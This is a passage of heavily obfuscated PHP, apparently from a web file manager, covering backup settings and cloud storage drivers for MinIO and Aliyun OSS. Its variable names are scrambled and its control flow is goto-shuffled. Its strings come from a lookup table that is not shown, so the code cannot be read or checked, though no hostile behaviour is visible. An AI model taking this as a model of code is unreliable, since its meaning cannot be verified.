array($F“×†ƒ„¶[688] => 0, $F“×†ƒ„¶[694] => 0, $F“×†ƒ„¶[695] => 0), $F“×†ƒ„¶[167] => array($F“×†ƒ„¶[688] => 0, $F“×†ƒ„¶[697] => 0, $F“×†ƒ„¶[698] => 0, $F“×†ƒ„¶[699] => 0, $F“×†ƒ„¶[700] => 0, $F“×†ƒ„¶[419] => $a††¤»Ñ¿•)), $F“×†ƒ„¶[701] => time(), $F“×†ƒ„¶[702] => 0); $a¤òò¼«Í = Model($F“×†ƒ„¶[687])->insert($e®Ôœ¥÷À); goto B‡Ëƒ—æñ; B‡Ëƒ—æñ: $e®Ôœ¥÷À[$F“×†ƒ„¶[367]] = $a¤òò¼«Í; return $e®Ôœ¥÷À; goto CÑºÆÂ²–¡; CÑºÆÂ²–¡: } private function checkStore($eŠ­ÈçàÛğ) { $c½‹ÚôŸ³ô =& $_SERVER[îÖ]; $A¯¾š’Ô®Ü = Model($c½‹ÚôŸ³ô[703])->listData($eŠ­ÈçàÛğ); Model($c½‹ÚôŸ³ô[703])->checkConfig($A¯¾š’Ô®Ü); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[îÖ][687])->findByName(self::$name); } return self::$option; } public static function set($b¬ÕÏí…Ó) { $c‚Ó¼‹Ÿ¿ =& $_SERVER[îÖ]; $E’øß‡¢Àò = self::get(); foreach ($b¬ÕÏí…Ó as $BÓà·ƒÊÜ => $EÚÈÏ¥Äâó) { $aêóª‘’²á = explode($c‚Ó¼‹Ÿ¿[91], $BÓà·ƒÊÜ); $d°Œ ˆ¬ÏÏ = count($aêóª‘’²á); switch ($d°Œ ˆ¬ÏÏ) { case 1: $E’øß‡¢Àò[$aêóª‘’²á[0]] = $EÚÈÏ¥Äâó; break; case 2: $E’øß‡¢Àò[$aêóª‘’²á[0]][$aêóª‘’²á[1]] = $EÚÈÏ¥Äâó; break; case 3: $E’øß‡¢Àò[$aêóª‘’²á[0]][$aêóª‘’²á[1]][$aêóª‘’²á[2]] = $EÚÈÏ¥Äâó; break; } } Model($c‚Ó¼‹Ÿ¿[687])->update($E’øß‡¢Àò[$c‚Ó¼‹Ÿ¿[367]], $E’øß‡¢Àò); self::$option = $E’øß‡¢Àò; return self::$option; } public function keep() { $a½×ÆöŒ³  =& $_SERVER[îÖ]; $c•±ß­ƒÒÄ = self::get(); if ($c•±ß­ƒÒÄ[$a½×ÆöŒ³ [281]][$a½×ÆöŒ³ [692]][$a½×ÆöŒ³ [688]] == $a½×ÆöŒ³ [83]) { return; } $this->backupKeep($c•±ß­ƒÒÄ); self::set(array($a½×ÆöŒ³ [704] => 1)); } private function backupKeep($cÍçÂÆğ) { goto d§·Šôßâ; d§·Šôßâ: $cùÉ–»¡ÊĞ =& $_SERVER[îÖ]; $Eéå‘©íƒÛ = Model($cùÉ–»¡ÊĞ[687])->listData(); if (empty($Eéå‘©íƒÛ)) { return; } goto Fï‰äÎ¤¾; Fï‰äÎ¤¾: $BÖÚ“Ğç… = 0; $CÕ‚âÊí‘– = array(); foreach ($Eéå‘©íƒÛ as $cÕÆ‰öÑÙ) { if ($BÖÚ“Ğç… >= 7) { break; } $CÕ‚âÊí‘–[] = $cÕÆ‰öÑÙ[$cùÉ–»¡ÊĞ[28]]; $BÖÚ“Ğç…++; } goto C¶¬±È™¯; C¶¬±È™¯: for ($BÖÚ“Ğç… = 0; $BÖÚ“Ğç… < 12; $BÖÚ“Ğç…++) { $CÕ‚âÊí‘–[] = date($cùÉ–»¡ÊĞ[705], strtotime("\x2d{$BÖÚ“Ğç…}\x20\x6d\x6f\x6e\164\x68\163")); } $CÕ‚âÊí‘– = array_unique($CÕ‚âÊí‘–); foreach ($Eéå‘©íƒÛ as $cÕÆ‰öÑÙ) { if (!empty($cÕÆ‰öÑÙ[$cùÉ–»¡ÊĞ[28]]) && in_array($cÕÆ‰öÑÙ[$cùÉ–»¡ÊĞ[28]], $CÕ‚âÊí‘–)) { continue; } Model($cùÉ–»¡ÊĞ[687])->remove($cÕÆ‰öÑÙ[$cùÉ–»¡ÊĞ[367]]); $D¶ïòˆæ = "\x7b\x69\x6f\x3a{$cÍçÂÆğ[$cùÉ–»¡ÊĞ[690]]}\x7d\x2f\144\x61\164\141\x62\x61\x73\x65\x2f\142\x61\x63\x6b\165\x70\137{$cÕÆ‰öÑÙ[$cùÉ–»¡ÊĞ[28]]}"; IO::remove($D¶ïòˆæ, !1); } goto C‘¦ëáÉËÉ; C‘¦ëáÉËÉ: } public function db() { goto a’Å…çÇÇ; eƒé¦½²Ñ½: $D´îŠñ×³ = new BackupDb(); if (!$D´îŠñ×³->index()) { return !1; } self::set(array($d²‹Ñ›ÒèË[706] => 1)); goto fŞÇô•‡’Ø; a’Å…çÇÇ: $d²‹Ñ›ÒèË =& $_SERVER[îÖ]; $BòŞ©ÎîÅõ = self::get(); if ($BòŞ©ÎîÅõ[$d²‹Ñ›ÒèË[281]][$d²‹Ñ›ÒèË[693]][$d²‹Ñ›ÒèË[688]] == $d²‹Ñ›ÒèË[83]) { return !0; } goto eƒé¦½²Ñ½; fŞÇô•‡’Ø: return !0; goto fõÍæÈÃÔÆ; fõÍæÈÃÔÆ: } public function dbFile() { goto cÙ¿á„˜ç; D„‹‚´ÅÈİ: return !0; goto eììÚ²Î; cÙ¿á„˜ç: $aôˆ°ÜĞ†· =& $_SERVER[îÖ]; $Bğ¨‹±‘ò = self::get(); if ($Bğ¨‹±‘ò[$aôˆ°ÜĞ†·[281]][$aôˆ°ÜĞ†·[696]][$aôˆ°ÜĞ†·[688]] == $aôˆ°ÜĞ†·[83]) { return !0; } goto còå÷Ñ‘ó; còå÷Ñ‘ó: $E¢—ó¸‰‰Ú = new BackupDbFile(); if (!$E¢—ó¸‰‰Ú->index()) { return !1; } self::set(array($aôˆ°ÜĞ†·[707] => 1)); goto D„‹‚´ÅÈİ; eììÚ²Î: } public function file() { $fÖ¢ô“•ƒ =& $_SERVER[îÖ]; $Bœ‘¹ĞË¨ = self::get(); if ($Bœ‘¹ĞË¨[$fÖ¢ô“•ƒ[281]][$fÖ¢ô“•ƒ[167]][$fÖ¢ô“•ƒ[688]] == $fÖ¢ô“•ƒ[83]) { return !0; } if (!isset($Bœ‘¹ĞË¨[$fÖ¢ô“•ƒ[691]]) || $Bœ‘¹ĞË¨[$fÖ¢ô“•ƒ[691]] == $fÖ¢ô“•ƒ[468]) { $f­Šğé÷ËÓ = new BackupFile(); if (!$f­Šğé÷ËÓ->index()) { return !1; } } self::set(array($fÖ¢ô“•ƒ[708] => 1, $fÖ¢ô“•ƒ[688] => 1)); return !0; } } goto dˆ³Á‘Ş¼¡; FÈµˆ¥ã‘Œ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($D¾ËìÅĞÏø) { parent::__construct($D¾ËìÅĞÏø); $this->signatureVersion($_SERVER[îÖ][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($EäÌµô‡ºÛ) { parent::__construct($EäÌµô‡ºÛ); $this->signatureVersion($_SERVER[îÖ][200]); } public function fileOutLink($cŠÔ©†è“‚) { $fÚÙ•Á…½õ =& $_SERVER[îÖ]; if (substr($cŠÔ©†è“‚, 0, 7) == $fÚÙ•Á…½õ[1109]) { $cŠÔ©†è“‚ = $fÚÙ•Á…½õ[1110] . substr($cŠÔ©†è“‚, 7); } header($fÚÙ•Á…½õ[156] . $cŠÔ©†è“‚); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($e¼–ß¶öˆÍ) { parent::__construct(); include_once SDK_DIR . $_SERVER[îÖ][1165]; $this->_init($e¼–ß¶öˆÍ); } public function _init($b§Â·å¨ˆŸ) { foreach ($b§Â·å¨ˆŸ as $Aßµ‚®ÊÒé => $f½¡Ø”©Å¬) { if (isset($this->{$Aßµ‚®ÊÒé})) { $this->{$Aßµ‚®ÊÒé} = $f½¡Ø”©Å¬; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[îÖ][1166], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto eòØé¢óÏŒ; bëÇ’Ø“å: $E‡®³‘‘…™->addRule($c›…£ßôŠŸ); try { $this->client->putBucketCors($this->bucket, $E‡®³‘‘…™); } catch (OSS\Core\OssException $E›‹¿‹«°) { return !1; } return !0; goto e×“ö®—íÄ; fŒª•Æ‘Â’: $c›…£ßôŠŸ->setMaxAgeSeconds(600); $c›…£ßôŠŸ->addExposeHeader($B¸ÂõŞÍ‰Ç[1172]); $c›…£ßôŠŸ->addAllowedHeader($B¸ÂõŞÍ‰Ç[1167]); goto bëÇ’Ø“å; a”ßëé¢§å: $c›…£ßôŠŸ->addAllowedMethod($B¸ÂõŞÍ‰Ç[1170]); $c›…£ßôŠŸ->addAllowedMethod($B¸ÂõŞÍ‰Ç[1171]); $c›…£ßôŠŸ->addAllowedMethod($B¸ÂõŞÍ‰Ç[155]); goto fŒª•Æ‘Â’; e¬«›àÙ°: $c›…£ßôŠŸ->addAllowedOrigin($B¸ÂõŞÍ‰Ç[1167]); $c›…£ßôŠŸ->addAllowedMethod($B¸ÂõŞÍ‰Ç[1168]); $c›…£ßôŠŸ->addAllowedMethod($B¸ÂõŞÍ‰Ç[1169]); goto a”ßëé¢§å; eòØé¢óÏŒ: $B¸ÂõŞÍ‰Ç =& $_SERVER[îÖ]; $E‡®³‘‘…™ = new OSS\Model\CorsConfig(); $c›…£ßôŠŸ = new OSS\Model\CorsRule(); goto e¬«›àÙ°; e×“ö®—íÄ: } public function getBucketCors() { goto FÊíŒÀƒŞ; FÊíŒÀƒŞ: $E¸†ã‚Œ =& $_SERVER[îÖ]; $F¥§ÙØÎ = null; try { $F¥§ÙØÎ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $B²İÉ‹®—Ş) { return null; } goto BôŠŸÒìÁì; BôŠŸÒìÁì: if (!$F¥§ÙØÎ || !($c½ºµã”í“ = $F¥§ÙØÎ->getRules())) { return null; } $CÖˆ¾ãÉ» = $c½ºµã”í“[0]->getAllowedOrigins(); $Fó±Ë¯®ï = $c½ºµã”í“[0]->getAllowedMethods(); goto aµÉàÓ‘¯­; aµÉàÓ‘¯­: $bÂÍ•Çà‰ô = $c½ºµã”í“[0]->getMaxAgeSeconds(); $Fáæßá¦Î = $c½ºµã”í“[0]->getExposeHeaders(); $d¨—ÒÀ¶˜İ = $c½ºµã”í“[0]->getAllowedHeaders(); goto DÓ²ìÈï®; DÓ²ìÈï®: return array($E¸†ã‚Œ[175] => isset($CÖˆ¾ãÉ»[0]) ? $CÖˆ¾ãÉ»[0] : $E¸†ã‚Œ[33], $E¸†ã‚Œ[179] => $Fó±Ë¯®ï, $E¸†ã‚Œ[1173] => $bÂÍ•Çà‰ô, $E¸†ã‚Œ[1174] => isset($Fáæßá¦Î[0]) ? $Fáæßá¦Î[0] : $E¸†ã‚Œ[33], $E¸†ã‚Œ[177] => isset($d¨—ÒÀ¶˜İ[0]) ? $d¨—ÒÀ¶˜İ[0] : $E¸†ã‚Œ[33]); goto e»ê éŒ¾¯; e»ê éŒ¾¯: } public function isBucketCors() { goto d‡Öê¢µŒ; A»™ï»Éõ·: if ($E…ìç²ÏÃ[$F‡¶„É¦«œ[175]] != $F‡¶„É¦«œ[176] || $E…ìç²ÏÃ[$F‡¶„É¦«œ[177]] != $F‡¶„É¦«œ[176]) { return !1; } $AñÆÀŠâ = array_map($F‡¶„É¦«œ[178], $E…ìç²ÏÃ[$F‡¶„É¦«œ[179]]); if (!is_array($AñÆÀŠâ)) { $AñÆÀŠâ = array(); } goto b™òİà„Ïì; b™òİà„Ïì: $F…ÌŞ¹ä’­ = array($F‡¶„É¦«œ[180], $F‡¶„É¦«œ[181], $F‡¶„É¦«œ[182], $F‡¶„É¦«œ[183], $F‡¶„É¦«œ[184]); $cÓËîµÚ¾Ò = array_diff($F…ÌŞ¹ä’­, $AñÆÀŠâ); return empty($cÓËîµÚ¾Ò); goto E¿æ„ÚÖÛå; d‡Öê¢µŒ: $F‡¶„É¦«œ =& $_SERVER[îÖ]; $E…ìç²ÏÃ = $this->getBucketCors(); if (!$E…ìç²ÏÃ || !is_array($E…ìç²ÏÃ)) { return !1; } goto A»™ï»Éõ·; E¿æ„ÚÖÛå: } public function mkfile($A¿õ¥Á°ÌÙ, $F¸Æ„ßîÇª = '', $B¶¦Å°ù²ê = REPEAT_RENAME) { $B‚™–×¢ÅÅ = $this->setContent($A¿õ¥Á°ÌÙ, $F¸Æ„ßîÇª); if ($B‚™–×¢ÅÅ !== !1) { return $this->getPathOuter($A¿õ¥Á°ÌÙ); } return !1; } public function mkdir($dè§·å‰®, $C®™­½ò¹ = REPEAT_SKIP) { if ($this->_isFolder($dè§·å‰®)) { return $this->getPathOuter($dè§·å‰®); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($dè§·å‰®)); } catch (OSS\Core\OssException $d¢‰Ûñ´¬À) { return !1; } return $this->getPathOuter($dè§·å‰®); } private function fileList($a¹¾ÓÆ„æ, $c¥ÔùÀËË = '', $e¨¾„Ó…îÁ = 0) { goto C×æ¹‘Õ›¯; E…á±µ¹—: $a®»õ‡Âë = $C³ªÒëµø¬[33]; $cˆõ¡•ŸŠ÷ = 1000; $E©„Ò¸Õ»˜ = $e“ºÙÕª¨ = array(); goto cÌÖˆŒã; C×æ¹‘Õ›¯: $C³ªÒëµø¬ =& $_SERVER[îÖ]; $a¹¾ÓÆ„æ = trim($a¹¾ÓÆ„æ, $C³ªÒëµø¬[8]); $AòµÁ¨ˆ»ë = empty($a¹¾ÓÆ„æ) ? $C³ªÒëµø¬[33] : $a¹¾ÓÆ„æ . $C³ªÒëµø¬[8]; goto E…á±µ¹—; cÌÖˆŒã: while (!0) { $EöèÇÇŒ” = array($C³ªÒëµø¬[1175] => $c¥ÔùÀËË, $C³ªÒëµø¬[186] => $AòµÁ¨ˆ»ë, $C³ªÒëµø¬[1176] => $cˆõ¡•ŸŠ÷, $C³ªÒëµø¬[1177] => $a®»õ‡Âë); try { $c¤‡Ô©İ¨Ò = $this->client->listObjects($this->bucket, $EöèÇÇŒ”); } catch (OSS\Core\OssException $cê²ˆ¼­ö») { break; } $a®»õ‡Âë = $c¤‡Ô©İ¨Ò->getNextMarker(); $a§…Ğ¸ìä¨ = $c¤‡Ô©İ¨Ò->getObjectList(); $AÖˆê­¶¾È = $c¤‡Ô©İ¨Ò->getPrefixList(); foreach ($a§…Ğ¸ìä¨ as $C‹ÎÆÄĞ¼) { if ($C‹ÎÆÄĞ¼->getKey() == $AòµÁ¨ˆ»ë) { continue; } $c×¨ËÇÇá¼ = $C‹ÎÆÄĞ¼->getKey(); if ($e¨¾„Ó…îÁ) { $c×¨ËÇÇá¼ = array($C³ªÒëµø¬[28] => $c×¨ËÇÇá¼, $C³ªÒëµø¬[77] => $C‹ÎÆÄĞ¼->getSize(), $C³ªÒëµø¬[190] => strtotime($C‹ÎÆÄĞ¼->getLastModified())); } $e“ºÙÕª¨[] = $c×¨ËÇÇá¼; } foreach ($AÖˆê­¶¾È as $F®ÀàèîŞ) { $E©„Ò¸Õ»˜[] = $F®ÀàèîŞ->getPrefix(); } if ($a®»õ‡Âë === $C³ªÒëµø¬[33]) { break; } } return array($C³ªÒëµø¬[74] => $E©„Ò¸Õ»˜, $C³ªÒëµø¬[73] => $e“ºÙÕª¨); goto CÚ±´ààŸ…; CÚ±´ààŸ…: } public function copyFile($e°ÆµµÜóå, $A’œ×ô) { $bÀ£›ÔÓ…‰ = $this->size($e°ÆµµÜóå); if ($bÀ£›ÔÓ…‰ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $e°ÆµµÜóå, $this->bucket, $this->pathEncode($A’œ×ô)); } catch (OSS\Core\OssException $e“÷èíé¢) { return !1; } return $this->getPathOuter($A’œ×ô); } $FÔ‡—„ì«À = $this->multiCopyObject($e°ÆµµÜóå, $A’œ×ô, $bÀ£›ÔÓ…‰); return $FÔ‡—„ì«À ? $this->getPathOuter($A’œ×ô) : !1; } private function multiCopyObject($D—î¢šˆŒœ, $BË—±Á°×, $E¨îÎ™‰âá) { $eæ°¡ØÍÙ =& $_SERVER[îÖ]; try { goto EĞôá‚õœ©; Bó®•¸¢©: $a—…¬¨Àä´ = array(); foreach ($dçœøÌÃç as $Cİµä®Ëƒ‚ => $Fñ´¤ß‹µ¿) { $a—…¬¨Àä´[] = array($eæ°¡ØÍÙ[1182] => $Cİµä®Ëƒ‚ + 1, $eæ°¡ØÍÙ[1183] => $Fñ´¤ß‹µ¿); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($BË—±Á°×), $bâ­Î¬‚é², $a—…¬¨Àä´); goto Eõ¤âäŠ†; bª÷ë…–Ë: $dï“»Ì¹÷Ñ = 1; $D‚¥š–”‰ = 0; $dçœøÌÃç = array(); goto BÂ´“Ô‚à; BÂ´“Ô‚à: $BÆÕ±Û³¡¤ = 1024 * 1024 * 10; $Fåöøá¦®à = $this->client->generateMultiuploadParts($E¨îÎ™‰âá, $BÆÕ±Û³¡¤); foreach ($Fåöøá¦®à as $Cİµä®Ëƒ‚ => $Fğ·ÚßÁ) { $aÌˆ–Ôëø = $D‚¥š–”‰ + (int) $Fğ·ÚßÁ[$eæ°¡ØÍÙ[1179]]; $d•°Õä¡ïê = (int) $Fğ·ÚßÁ[$eæ°¡ØÍÙ[325]] + $aÌˆ–Ôëø - 1; $EŒ¯Öî†ãá = array($eæ°¡ØÍÙ[1180] => $aÌˆ–Ôëø, $eæ°¡ØÍÙ[1181] => $d•°Õä¡ïê); $dçœøÌÃç[] = $this->client->uploadPartCopy($this->bucket, $D—î¢šˆŒœ, $this->bucket, $this->pathEncode($BË—±Á°×), $dï“»Ì¹÷Ñ, $bâ­Î¬‚é², $EŒ¯Öî†ãá); $dï“»Ì¹÷Ñ = $dï“»Ì¹÷Ñ + 1; } goto Bó®•¸¢©; EĞôá‚õœ©: $bàŒÃí¸¬¶ = array(); if ($EéÀ¹á„å· = $this->hashMd5($D—î¢šˆŒœ)) { $bàŒÃí¸¬¶ = array(OSS\OssClient::OSS_HEADERS => array($eæ°¡ØÍÙ[1178] => $EéÀ¹á„å·)); } $bâ­Î¬‚é² = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($BË—±Á°×), $bàŒÃí¸¬¶); goto bª÷ë…–Ë; Eõ¤âäŠ†: } catch (OSS\Core\OssException $cŞõî£‰ëğ) { return !1; } return !0; } public function moveFile($Dæ™è‘“³ˆ, $cÎ’¹ÃïÓ) { if ($this->copyFile($Dæ™è‘“³ˆ, $cÎ’¹ÃïÓ)) { $this->remove($Dæ™è‘“³ˆ); return $this->getPathOuter($cÎ’¹ÃïÓ); } return !1; } public function delFile($aÕéãå©í) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($aÕéãå©í)); } catch (OSS\Core\OssException $C¢Ê‰İ’) { return !1; } return !0; } public function delFolder($bİ»öÖÌÛ´) { $d¸‚ØÜ×³Ç =& $_SERVER[îÖ]; $f¹ƒ×ƒêã‹ = $this->fileList($bİ»öÖÌÛ´); if (!empty($bİ»öÖÌÛ´) && !in_array(trim($bİ»öÖÌÛ´, $d¸‚ØÜ×³Ç[8]) . $d¸‚ØÜ×³Ç[8], $f¹ƒ×ƒêã‹[$d¸‚ØÜ×³Ç[73]])) { $f¹ƒ×ƒêã‹[$d¸‚ØÜ×³Ç[73]][] = trim($bİ»öÖÌÛ´, $d¸‚ØÜ×³Ç[8]) . $d¸‚ØÜ×³Ç[8]; } foreach (array_chunk($f¹ƒ×ƒêã‹[$d¸‚ØÜ×³Ç[73]], 1000) as $A™œ®ø’ğ) { try { $this->client->deleteObjects($this->bucket, $A™œ®ø’ğ); } catch (OSS\Core\OssException $E®âöõœé) { continue; } } return !0; } public function rename($E¨°ˆ™’èÔ, $f¾Ö±ª•¯ˆ) { return $this->renameObject($E¨°ˆ™’èÔ, $f¾Ö±ª•¯ˆ); } private function fileInfo($a„‡Æáîˆ•, $b´Æâ±ƒ£ = array()) { goto BÉÁãç‰öÄ; BÉÁãç‰öÄ: $DÂ¦µ’¼¨’ =& $_SERVER[îÖ]; $c»ÊğäõŸé = array($DÂ¦µ’¼¨’[28] => $this->pathThis($a„‡Æáîˆ•), $DÂ¦µ’¼¨’[75] => $this->getPathOuter($a„‡Æáîˆ•), $DÂ¦µ’¼¨’[29] => $DÂ¦µ’¼¨’[167], $DÂ¦µ’¼¨’[187] => 0, $DÂ¦µ’¼¨’[107] => 0, $DÂ¦µ’¼¨’[77] => 0, $DÂ¦µ’¼¨’[160] => $this->ext($a„‡Æáîˆ•), $DÂ¦µ’¼¨’[188] => !0, $DÂ¦µ’¼¨’[189] => !0); if (empty($b´Æâ±ƒ£)) { $B†ÈÏêèáÒ = $this->objectMeta($a„‡Æáîˆ•); if (!$B†ÈÏêèáÒ) { return $c»ÊğäõŸé; } $b´Æâ±ƒ£ = array($DÂ¦µ’¼¨’[107] => strtotime($B†ÈÏêèáÒ[$DÂ¦µ’¼¨’[1184]]), $DÂ¦µ’¼¨’[77] => $B†ÈÏêèáÒ[$DÂ¦µ’¼¨’[1185]] + 0); } goto FÜœ ÈÌ”; bĞî…Øêƒ: return $c»ÊğäõŸé; goto fã°ƒøºÅÍ; FÜœ ÈÌ”: if (isset($b´Æâ±ƒ£[$DÂ¦µ’¼¨’[77]])) { $c»ÊğäõŸé[$DÂ¦µ’¼¨’[77]] = $b´Æâ±ƒ£[$DÂ¦µ’¼¨’[77]]; } if (isset($b´Æâ±ƒ£[$DÂ¦µ’¼¨’[107]])) { $c»ÊğäõŸé[$DÂ¦µ’¼¨’[107]] = $b´Æâ±ƒ£[$DÂ¦µ’¼¨’[107]]; } if (isset($b´Æâ±ƒ£[$DÂ¦µ’¼¨’[190]]) && !trim($c»ÊğäõŸé[$DÂ¦µ’¼¨’[107]])) { $c»ÊğäõŸé[$DÂ¦µ’¼¨’[107]] = $b´Æâ±ƒ£[$DÂ¦µ’¼¨’[190]]; } goto bĞî…Øêƒ; fã°ƒøºÅÍ: } private function folderInfo($bÜŠÀ’ÁŠã, $fÃ”çÎÙ‹° = array()) { $A¡İö‹Ü¸© =& $_SERVER[îÖ]; $b‰áØ©Óá = array($A¡İö‹Ü¸©[28] => $this->pathThis($bÜŠÀ’ÁŠã), $A¡İö‹Ü¸©[75] => $this->getPathOuter($A¡İö‹Ü¸©[8] . $bÜŠÀ’ÁŠã), $A¡İö‹Ü¸©[29] => $A¡İö‹Ü¸©[76], $A¡İö‹Ü¸©[187] => 0, $A¡İö‹Ü¸©[107] => 0, $A¡İö‹Ü¸©[188] => !0, $A¡İö‹Ü¸©[189] => !0); if (empty($fÃ”çÎÙ‹°)) { $bÜŠÀ’ÁŠã = rtrim($bÜŠÀ’ÁŠã, $A¡İö‹Ü¸©[8]) . $A¡İö‹Ü¸©[8]; $a£ÀæÍ¤Ëƒ = $this->objectMeta($bÜŠÀ’ÁŠã); if (!$a£ÀæÍ¤Ëƒ) { return $b‰áØ©Óá; } $fÃ”çÎÙ‹° = array($A¡İö‹Ü¸©[187] => $a£ÀæÍ¤Ëƒ[$A¡İö‹Ü¸©[1186]][$A¡İö‹Ü¸©[1187]], $A¡İö‹Ü¸©[107] => strtotime($a£ÀæÍ¤Ëƒ[$A¡İö‹Ü¸©[1184]])); } if (isset($fÃ”çÎÙ‹°[$A¡İö‹Ü¸©[107]])) { $b‰áØ©Óá[$A¡İö‹Ü¸©[107]] = $fÃ”çÎÙ‹°[$A¡İö‹Ü¸©[107]]; } if (isset($fÃ”çÎÙ‹°[$A¡İö‹Ü¸©[187]])) { $b‰áØ©Óá[$A¡İö‹Ü¸©[187]] = $fÃ”çÎÙ‹°[$A¡İö‹Ü¸©[187]]; } return $b‰áØ©Óá; } public function listPath($aÃÄİ·’Åé, $eğŒ¢æùì = false) { $DÌ‚‰¯Ò¡† =& $_SERVER[îÖ]; $aÙš‡¹®¢µ = $this->fileList($aÃÄİ·’Åé, $DÌ‚‰¯Ò¡†[8], !0); foreach ($aÙš‡¹®¢µ[$DÌ‚‰¯Ò¡†[74]] as $cß˜òä©—À => $Dö±İ¨íÃï) { $aÙš‡¹®¢µ[$DÌ‚‰¯Ò¡†[74]][$cß˜òä©—À] = $this->folderInfo($Dö±İ¨íÃï, $Dö±İ¨íÃï); } foreach ($aÙš‡¹®¢µ[$DÌ‚‰¯Ò¡†[73]] as $cß˜òä©—À => $Dö±İ¨íÃï) { $aÙš‡¹®¢µ[$DÌ‚‰¯Ò¡†[73]][$cß˜òä©—À] = $this->fileInfo($Dö±İ¨íÃï[$DÌ‚‰¯Ò¡†[28]], $Dö±İ¨íÃï); } return $aÙš‡¹®¢µ; } public function has($CØ¾¥øÁ«, $EøŒ£¶ÎŠ = false, $fïÃ »”‘à = true) { goto Cµ‹·ËÒ; Cµ‹·ËÒ: $d›È°„î‚İ =& $_SERVER[îÖ]; $CØ¾¥øÁ« = trim($CØ¾¥øÁ«, $d›È°„î‚İ[8]); $cÇœŠÀÅ§Ã = empty($CØ¾¥øÁ«) ? $d›È°„î‚İ[33] : $CØ¾¥øÁ« . $d›È°„î‚İ[8]; goto F’ÇÓÖ¹½; F’ÇÓÖ¹½: $Eëƒ”…¥© = $d›È°„î‚İ[33]; $CÈ„¿ö’† = 500; $CİÖ£Î = 0; goto DÑÎÒ…óï; DÑÎÒ…óï: $eÅŠ¯™ã = 0; while (!0) { $bÁ¯Ü¨´Ü = array($d›È°„î‚İ[1175] => $d›È°„î‚İ[8], $d›È°„î‚İ[186] => $cÇœŠÀÅ§Ã, $d›È°„î‚İ[1176] => $CÈ„¿ö’†, $d›È°„î‚İ[1177] => $Eëƒ”…¥©); try { $D‹Èê’¢à = $this->client->listObjects($this->bucket, $bÁ¯Ü¨´Ü); } catch (OSS\Core\OssException $DíÇîëÈ‘ê) { break; } $Eëƒ”…¥© = $D‹Èê’¢à->getNextMarker(); $D©ø„Š‹¿ = $D‹Èê’¢à->getObjectList(); $AÈîË·ˆæ³ = $D‹Èê’¢à->getPrefixList(); if ($EøŒ£¶ÎŠ) { if (count($D©ø„Š‹¿) > 1 || count($D©ø„Š‹¿) == 1 && $D©ø„Š‹¿[0]->getKey() != $cÇœŠÀÅ§Ã) { $CİÖ£Î += count($D©ø„Š‹¿) - 1; } if (!empty($AÈîË·ˆæ³)) { $eÅŠ¯™ã += count($AÈîË·ˆæ³); } if ($Eëƒ”…¥© === $d›È°„î‚İ[33]) { break; } continue; } if ($fïÃ »”‘à) { if (!empty($D©ø„Š‹¿)) { if (count($D©ø„Š‹¿) > 1 || $D©ø„Š‹¿[0]->getKey() != $cÇœŠÀÅ§Ã) { return !0; } } } else { if (!empty($AÈîË·ˆæ³)) { return !0; } } if ($Eëƒ”…¥© === $d›È°„î‚İ[33]) { break; } } if ($EøŒ£¶ÎŠ) { return array($d›È°„î‚İ[191] => $CİÖ£Î, $d›È°„î‚İ[192] => $eÅŠ¯™ã); } goto FìõØá‰¢; FìõØá‰¢: return !1; goto A¿²ÈŠçÁ„; A¿²ÈŠçÁ„: } public function listAll($EªŠÚ¯ÁÀ) { $CËö’³ØÇ =& $_SERVER[îÖ]; $aØËÊëõ — = $this->fileList($EªŠÚ¯ÁÀ, $CËö’³ØÇ[33], !0); $DëÆÊ²ÀëÌ = array(); foreach ($aØËÊëõ —[$CËö’³ØÇ[73]] as $AõÒêÒëÇë) { $DëÆÊ²ÀëÌ[$AõÒêÒëÇë[$CËö’³ØÇ[28]]] = $AõÒêÒëÇë[$CËö’³ØÇ[77]]; } return $this->listAllFiles($EªŠÚ¯ÁÀ, array_keys($DëÆÊ²ÀëÌ), $DëÆÊ²ÀëÌ); } public function canRead($bÂö¿ìö§) { $dÁªßÃØˆ½ =& $_SERVER[îÖ]; $D¿Ì¤¡Üç­ = $this->pathAcl($bÂö¿ìö§); return $D¿Ì¤¡Üç­ == $dÁªßÃØˆ½[1188] || $D¿Ì¤¡Üç­ == $dÁªßÃØˆ½[491] ? !0 : !1; } public function canWrite($f±œœø‹œ) { $DÅŸâÛ·Õ¯ = $this->pathAcl($f±œœø‹œ); return $DÅŸâÛ·Õ¯ == $_SERVER[îÖ][491] ? !0 : !1; } public function pathAcl($c„Õ·Ó©¢¥) { goto aÔª½¦Ã£…; aÔª½¦Ã£…: $fí­·„¦“ =& $_SERVER[îÖ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $bĞ­ŞóŒ¼ì = $this->client->getObjectAcl($this->bucket, $this->pathEncode($c„Õ·Ó©¢¥)); } catch (OSS\Core\OssException $d‰õ©Æ‚Ë–) { return !1; } goto B‘¬è•ìñ‰; fÇ‰äã‹°: return $d•¾˜¢ïÑ; goto f‘é‚Şéø­; B‘¬è•ìñ‰: $d•¾˜¢ïÑ = $bĞ­ŞóŒ¼ì == $fí­·„¦“[34] ? $this->bucketAcl : $bĞ­ŞóŒ¼ì; if ($d•¾˜¢ïÑ == $fí­·„¦“[1189]) { return $fí­·„¦“[1188]; } if ($d•¾˜¢ïÑ == $fí­·„¦“[1190]) { return $fí­·„¦“[491]; } goto fÇ‰äã‹°; f‘é‚Şéø­: } private function chmodPath($Aœ·™À±ù, $aÜ¸¡îÙê = '') { $e¯¸çõ†‰‡ =& $_SERVER[îÖ]; $Dƒ‰çÔÊ = empty($aÜ¸¡îÙê) ? 